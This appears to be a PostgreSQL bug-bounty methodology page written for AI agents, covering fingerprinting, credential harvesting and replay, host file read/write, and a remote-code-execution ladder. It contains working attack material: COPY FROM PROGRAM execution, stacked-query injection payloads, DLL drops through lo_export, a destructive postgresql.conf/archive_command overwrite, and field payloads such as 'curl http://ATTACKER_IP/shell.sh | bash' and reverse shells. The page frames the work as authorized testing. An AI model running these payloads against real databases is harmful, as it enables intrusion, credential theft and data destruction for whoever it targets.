---
technology: PostgreSQL
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: databases
evidence: "14 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 14 writeups in the writeup corpus + upstream-verified: postgresql.org docs (sql-copy Notes, auth-pg-hba-conf, sql-createextension Caution, release-11 notes), security advisories CVE-2023-39417 / CVE-2024-10979; all commands below traced to corpus writeups unless marked [upstream]"
---

Companion page: [[postgres|PostgreSQL overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# PostgreSQL Bug Bounty Methodology

**Scope:** PostgreSQL reached (a) over TCP 5432, (b) over the Unix socket after a foothold, (c) through SQL injection in a front-end app, (d) through a tunnel to an internal/dockerized instance. **Out of scope:** other SQL engines (MySQL/MariaDB, MSSQL, Oracle) — sibling units in this vault.

**Authorization:** everything below presumes written permission. Steps flagged **DESTRUCTIVE** (config overwrite, archive_command, user/role changes, large-object writes) can break production databases — capture pre-state (`SELECT * FROM pg_settings WHERE source='configuration file';`, dump the target config with `lo_export` first) and restore or document on exit.

## Decision tree (one screen)

1. Network-reachable 5432 → Phase 1 (fingerprint) → Phase 2 (credentials) → Phase 3.
2. Foothold on the host, no 5432 outside → find the socket / bind address (Phase 1b) → credential harvest (Phase 2) → Phase 3.
3. SQL injection with `UNION SELECT version()` working → Phase 6 (injection → RCE ladder) — check stacked queries first.
4. App creds in hand but DB not reachable → tunnel (chisel / ssh -L) to the DB network → Phase 3.

## Phase 1 — Fingerprinting

```bash
nmap -sV -p 5432 198.51.100.10            # service line: 5432/tcp open postgresql
psql "postgresql://user@example-db-host-mapping:5432/db" -c 'SELECT version();'
```

- On the host: `ss -lntp | grep 5432`, `ls /var/run/postgresql/` (socket `.s.PGSQL.5432`), `docker ps` (image `postgres:16`, `5432/tcp` mapping — field-observed).
- Client banner leaks server version even on failure: `psql -h /tmp -U postgres` printed `psql (18.1 (Debian 18.1-2), server 14.19 (Ubuntu …))` (field-observed).
- SQLi oracle: `0 UNION SELECT version(),'',…` in an injected parameter identifies PostgreSQL and exact build (observed: one chain used `sudo /usr/local/bin/genlabel` with a UNION payload; the error/success split is the oracle).

## Phase 1b — Local / socket reach

Observed pattern: PostgreSQL bound to loopback only. Reach it directly on the host, or forward:

```bash
# on target: find socket + try peer auth as the OS postgres user
sudo -u postgres psql          # peer auth → superuser, no password
psql -h /tmp -U postgres       # when PGDATA socket dir is /tmp (field-observed)

# tunnel an internal instance to your box (observed: dockerized pg at 172.16.0.x:5432 (the container address from ss/netstat))
./chisel client ATTACKER_IP:1234 R:8002:172.16.0.x:5432
psql -U postgres -h 127.0.0.1 -p 8002
```

## Phase 2 — Credential replay (the field's #1 access path)

Harvest locations that produced working `psql` logins in the field, in frequency order:

| Source | Example shape | Observed evidence |
|---|---|---|
| Java/Spring config | `application.properties` with `postgres:<pass>` → `psql -h 127.0.0.1 -U postgres` | field-observed |
| systemd unit | `Environment=DATABASE_URL="postgresql://download:<pass>@localhost:5432/download"` → `psql -U download -h 127.0.0.1 -W download` | field-observed |
| Source code | `create_engine('postgresql://dripmail_dba:<pass>@localhost/dripmail')` | field-observed |
| App-level creds | `psql -h localhost -p 5432 --username=dbuser -W <db>` | 3 observed shapes: incl. `psql -U sentry -W -c 'select … from auth_user'` and `psql -h 127.0.0.1 -U unixusrmgr unix` |
| Bash history | username in `~/.bash_history` + socket connect as that user | field-observed |

Then replay: `PGPASSWORD='<pass>' psql -h 127.0.0.1 -U <role> -d <db>`. If the role is `postgres` and 5432 is loopback-only, you are likely already superuser — go to Phase 4.

## Phase 3 — Post-auth enumeration

```sql
\du          -- roles: superuser? pg_read_server_files / pg_write_server_files / CREATE?
\dt          -- tables: look for password/user/token tables (observed: aaapassword, auth_user)
\list        -- databases
SELECT version();
SELECT current_user, session_user;
```

Observed frequency: `\dt`-then-loot-tables and `\du`-then-justify-RCE are the two dominant patterns. In one `\du` case the output was read specifically for the PG 11 default roles ("pg_read_server_files - allows user to read files …").

## Phase 4 — Privilege gates (verify before attempting RCE)

Upstream-verified rule (postgresql.org, sql-copy, Notes): "COPY naming a file or command is only allowed to database superusers or users who are granted one of the roles `pg_read_server_files`, `pg_write_server_files`, or `pg_execute_server_program`."

| You want | You need | Check |
|---|---|---|
| `COPY … FROM PROGRAM 'cmd'` | superuser or `pg_execute_server_program` | `\du` |
| `COPY … TO 'file'` / `FROM 'file'` | superuser or `pg_write_server_files` / `pg_read_server_files` | `\du` |
| `CREATE EXTENSION <trusted>` | `CREATE` on current database (PG 11+ trusted flag) | `SELECT has_database_privilege(current_user, current_database(), 'CREATE');` |
| `lo_import`/`lo_export` | superuser (or `pg_largeobject` write + role) | `\du` |
| config overwrite + `pg_reload_conf()` | superuser | `\du` |

If `\du` shows a plain app role: pivot to data loot only, or hunt a superuser session (SQLi context, cron jobs running `psql -U postgres` via `\i` scripts — see Phase 7 note).

## Phase 5 — Host file I/O (superuser / granted roles)

```sql
-- read a file into a table
CREATE TABLE f(t TEXT); COPY f FROM '/etc/postgresql/15/main/pg_hba.conf'; SELECT * FROM f;
-- write a file as the server user
COPY (SELECT 'content') TO '/tmp/proof';
```

Large-object variant (works where COPY paths are restricted; the field used it for config and DLL writes):

```sql
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');       -- OID 16384
SELECT lo_export(16384, '/etc/postgresql/15/main/postgresql.conf'); -- write back after edit
```

Windows shape (observed: DLL drop into System32 via sysnative path):

```
psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c 'create table dll("content" oid);'
psql.exe … -c "insert into dll(content) values(lo_import('C:/users/alice/pwn.dll'))"
psql.exe … -c "select lo_export(content, 'C:/windows/sysnative/pwn.dll') from dll"
```

## Phase 6 — RCE ladder

### 6a. COPY … FROM PROGRAM (three observed engagements; via SQLi: once)

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

Payloads seen in the field: `curl http://ATTACKER_IP/shell.sh | bash`, base64 pipe into bash, perl `IO::Socket` reverse shell with doubled single-quotes to escape, fifo `rm /tmp/f;mkfifo /tmp/f;…`.

### 6b. Via SQL injection (stacked queries)

PostgreSQL supports statement chaining; combine with dollar-quoting to dodge quote escaping (field-observed):

```sql
"', null);DROP TABLE IF EXISTS output; CREATE TABLE output(t TEXT); COPY output FROM PROGRAM 'touch /tmp/proof';-- "
"', null);DROP TABLE IF EXISTS output; CREATE TABLE output(t TEXT); COPY output FROM PROGRAM $$touch /tmp/proof$$;-- "
```

Gate: the injected session must hold superuser/`pg_execute_server_program` (one observed chain confirmed "The on indicates that the user is a superuser" before escalating).

### 6c. postgresql.conf overwrite + archive_command (field-observed)

**DESTRUCTIVE.** Chain: `lo_import` the original `postgresql.conf` → edit the stored large object (append `archive_command = '<command> %f %p'`) → `lo_export` it back over the live path → `SELECT pg_reload_conf();`. Runs as the server user on next archival. Always re-export the pristine config at the end.

## Phase 7 — Trusted-extension abuse [upstream-verified; not field-observed]

Two facts compose:

1. PG 11+ extension control files may set `trusted = true`; the docs state installation "will be permitted for anyone who has CREATE privilege on the current database" — the script still runs as the bootstrap superuser (postgresql.org, sql-createextension; measured 2026: `pgcrypto`, `citext`, `uuid-ossp`, `hstore` trusted; `vector`/PostGIS not).
2. CVE-2023-39417 (fixed 11.21/12.16/13.12/14.9/15.4, 2023-08-10; CVSS 7.5): an extension script using `@extowner@`/`@extschema@` inside a quoting construct is SQL-injectable, so **an attacker with only database-level CREATE privilege executes arbitrary code as the bootstrap superuser** when a vulnerable trusted non-bundled extension is installed (no bundled extension was vulnerable).

Operator test: `\dx` for installed extensions + `SELECT has_database_privilege(current_user, current_database(), 'CREATE');` — both true on a pre-Aug-2023 server with a non-bundled trusted extension is a superuser path that never touches COPY.

psql's `\i script.sql` meta-command (execute a local SQL file in-session) is the standard way ops cron drive privileged SQL [upstream, psql docs]; on a box you control, a world-writable script consumed by a root/`sudo` cron entry that calls `psql -f` or `\i` is direct RCE — hunt `/etc/cron*`, `~/.psql_history`, and `psql -f` strings in scripts. (No observed `\i` usage.)

## Phase 8 — pg_hba.conf enumeration [upstream-verified; not field-observed]

After file read (Phase 5) or host access, read the HBA file (`SHOW hba_file;` → read that path). Semantics that matter (postgresql.org, auth-pg-hba-conf): records are `TYPE DATABASE USER ADDRESS METHOD`; **first matching record wins**; `local` = Unix socket, `host`/`hostssl`/`hostnossl` = TCP; methods `trust` (no auth), `peer` (OS user match, socket only), `md5`/`scram-sha-256`, `cert`, `ldap`… Findings: any `trust` line, `peer` on a group you can become, md5 (older, replayable verifier), and `listen_addresses` in `postgresql.conf` wider than intended. Reload required to apply (`pg_reload_conf()`/SIGHUP) — a gap between file and running config is itself reportable.

## Verified CVE table

| CVE | Component | Gate | Impact | Fixed |
|---|---|---|---|---|
| CVE-2023-39417 | core server (extension scripts) | trusted non-bundled extension installed + attacker CREATE on DB | SQLi in script → code as bootstrap superuser | 11.21, 12.16, 13.12, 14.9, 15.4 (2023-08-10) |
| CVE-2024-10979 | PL/Perl | unprivileged DB user, PL/Perl installed | changes sensitive process environment variables (e.g. PATH) in trusted contexts | see postgresql.org advisory |

Do not carry version-specific claims beyond these two without re-verifying against postgresql.org/support/security — treat any "PostgreSQL CVE" from a third-party list as unverified until checked there.

## Command quick reference

```bash
psql -h 127.0.0.1 -U postgres -d db            # TCP login
psql -h /tmp -U postgres                        # socket dir connect
PGPASSWORD='x' psql -U dbuser -W -H localhost -p 5432 db
psql -U role -d db -c "select username,password from auth_user where is_staff;"   # field-observed
psql -U role -d db -f script.sql                # file execution [upstream]
pg_dump -U postgres db > out.sql                # loot exfil (observed marker)
```

## Appendix A — Tool mapping (prose)

- **psql** — the universal client; meta-commands `\du \dt \list \i \copy`; flags `-h -p -U -d -W -c -f`.
- **pg_dump / pg_restore** — structured loot and cross-host moves.
- **hashcat / John** — cracking harvested pg password hashes (`md5<md5(user+pass)>` verifiers; scram verifiers are not directly crackable offline).
- **chisel / ssh -L** — reaching loopback/internal 5432 (field-observed).
- **Metasploit `postgres` modules** — auxiliary scanners for version/creds when 5432 is exposed.
- **sqlmap** — drives the Phase 6b ladder against SQLi endpoints (`--dbms=postgresql`, stacked queries).
